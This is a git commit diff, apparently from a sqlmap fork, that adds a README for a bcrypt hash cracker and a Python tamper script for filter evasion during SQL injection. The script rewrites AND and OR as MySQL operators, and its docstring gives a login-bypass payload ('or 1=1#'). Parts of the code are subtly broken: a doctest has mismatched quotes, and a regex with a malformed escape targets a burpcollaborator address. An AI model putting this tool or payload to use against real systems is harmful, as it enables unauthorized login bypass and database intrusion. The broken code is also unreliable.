407af0f9cdbc09a588847201ecd27f5ca703797f
nu11secur1ty <venvaropt@gmail.com>
2025-11-30 13:55:03 +0200

    11/30/25-chusa-1.7-tools

---
+++ tools/Bcrypt-forcer/README.md
@@ -0,0 +1,6 @@
+# Bcrypt-forcer
+
+- `sqlmap` decryption tool
+
+`Bcrypt` hash cracker. 
+![Demo](https://github.com/nu11secur1ty/sqlmap-nu11secur1ty/blob/main/tools/Bcrypt-forcer/Docs/Screenshot%202022-05-24%20092133.png)
---
+++ tools/tamper-nu11secur1ty/bypass.py
@@ -0,0 +1,33 @@
+#!/usr/bin/env python
+
+"""
+Copyright (c) 2006-2023 nu11secur1ty (https://sqlmap.org/, https://www.nu11secur1ty.com/)
+See the file 'LICENSE' for copying permission
+"""
+import re
+from lib.core.data import kb
+from lib.core.enums import PRIORITY
+
+__priority__ = PRIORITY.HIGHEST
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    """
+    Injects bypass login
+
+    Requirement:
+        * MySQL
+
+    >>> tamper('nu11secur1ty' or 1=1#')
+    """
+
+    retVal = payload
+
+    if payload:
+        retVal = re.sub('\\bAND\\b', '&&', retVal)
+        retVal = re.sub('\\bOR\\b', '||', retVal)
+        retVal = re.sub('\\nu11secur1ty@burpcollaborator.net\\b', '||', retVal)
+
+    return retVal
